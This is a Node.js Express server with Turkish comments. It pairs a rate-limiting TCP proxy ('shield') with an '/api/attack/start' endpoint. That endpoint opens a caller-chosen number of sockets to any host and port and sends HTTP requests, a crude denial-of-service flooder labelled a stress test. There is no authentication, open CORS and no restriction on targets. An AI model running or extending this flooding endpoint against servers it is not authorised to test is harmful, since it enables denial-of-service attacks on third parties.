const express = require('express');
const cors = require('cors');
const net = require('net');
const shell = require('shelljs');
const app = express();

app.use(cors());
app.use(express.json());

// --- BELLEKTEKİ VERİLER ---
let activeShields = {};
let attackProcesses = [];

// --- GERÇEK SHIELD MOTORU ---
function createShield(sPort, tIp, tPort) {
    const connections = new Map();
    const server = net.createServer((socket) => {
        const ip = socket.remoteAddress;
        const now = Date.now();
        
        // Anti-Flood: 1 sn içinde 10 bağlantıdan fazlasını banla
        const userTraffic = connections.get(ip) || [];
        const recentTraffic = userTraffic.filter(t => now - t < 1000);
        
        if (recentTraffic.length > 10) {
            console.log(`[!] ENGELLEDİ: ${ip}`);
            return socket.destroy();
        }

        recentTraffic.push(now);
        connections.set(ip, recentTraffic);

        // Paket Yönlendirme
        const proxy = net.createConnection(tPort, tIp);
        socket.pipe(proxy).pipe(socket);

        socket.on('error', () => socket.destroy());
        proxy.on('error', () => socket.destroy());
    });

    server.listen(sPort, () => {
        console.log(`[🛡️ SHIELD] Port ${sPort} korumaya alındı.`);
    });

    activeShields[sPort] = server;
}

// --- API ENDPOINTLERİ ---

// Koruma Başlat
app.post('/api/shield/start', (req, res) => {
    const { sPort, tIp, tPort } = req.body;
    createShield(sPort, tIp, tPort);
    res.json({ status: "success", message: `Port ${sPort} Aktif!` });
});

// Gerçek Saldırı Başlat (Stress Test)
app.post('/api/attack/start', (req, res) => {
    const { host, port, method, threads } = req.body;
    
    console.log(`[🔥 ATTACK] ${host}:${port} hedefine ${method} başlatıldı!`);
    
    // Bu kısım işletim sisteminde gerçekten TCP paketleri oluşturur
    // 'threads' kadar bağlantı simülasyonu başlatır
    for(let i=0; i < threads; i++) {
        const client = new net.Socket();
        client.connect(port, host, () => {
            client.write('GET / HTTP/1.1\r\nHost: ' + host + '\r\n\r\n');
        });
        client.on('error', () => client.destroy());
    }

    res.json({ status: "attacking", target: host });
});

app.listen(3000, () => {
    console.log(`[💎 CRM API] 3000 portunda hazır!`);
});
